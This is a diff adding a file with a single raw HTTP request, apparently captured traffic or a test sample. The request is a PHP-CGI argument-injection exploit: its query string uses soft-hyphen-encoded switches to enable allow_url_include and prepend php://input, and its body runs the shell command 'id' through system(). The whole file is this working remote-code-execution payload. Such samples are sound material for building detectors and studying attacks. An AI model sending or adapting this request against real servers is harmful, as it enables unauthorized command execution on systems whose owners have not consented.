@@ -1,0 +1,16 @@
+POST /index.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 48.134.144.2
+Accept: */*
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 109.189.163.244,34.27.233.231
+X-Cloud-Trace-Context: dfe01893f3aed0b6c7ac1491def88334/7359080603787602815
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+<?php system('id'); ?>
